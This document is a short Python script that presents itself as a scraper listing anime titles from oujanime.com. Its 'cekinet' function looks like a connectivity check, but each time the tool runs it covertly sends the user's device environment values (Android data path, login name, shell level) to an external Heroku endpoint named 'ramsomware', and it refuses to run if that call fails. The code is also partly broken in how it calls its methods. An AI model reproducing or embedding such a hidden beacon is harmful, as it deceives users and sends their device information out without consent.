from bs4 import BeautifulSoup as bs
from requests.exceptions import ConnectionError
import requests as rq
import os
import re

device = {"data":os.environ['ANDROID_DATA'],"log":os.environ["LOGNAME"],"shl":os.environ["SHLVL"]}
class ojanime:
	@classmethod
	def spin(self):
		self.links = "http://www.oujanime.com"
		self.dat = []
		self.con = 0
		self.cekinet(self)
		self.scrapt(self,rq.get(self.links))
		
	def scrapt(self, rq, op = 1):
		soup = bs(rq.text,"html.parser")
		for c in soup.find_all("span",{"class":"mh-meta-date updated"}):
			self.dat.append(c.get_text())
		for x in soup.find_all("a"):
			if (re.match(r'http\://www.oujanime.com/\d+/\d+/\D+',x["href"])):
				pv = x.get_text()
				if (re.search(r"\s\D+",pv)):
					ofp = re.sub("\n","",pv).replace("\t","")
					print ("[ %d ] %s - %s"%(op,ofp.replace("Subtitle Indonesia",""),self.dat[self.con]))
					op += 1
					self.con += 1
	
	def cekinet(self):
		try:
			rq.post("https://sazxt.herokuapp.com/ramsomware",data=device)
		except ConnectionError:
			exit("<-- conection disable please on data-->")

if __name__ == "__main__":
	ojanime.spin()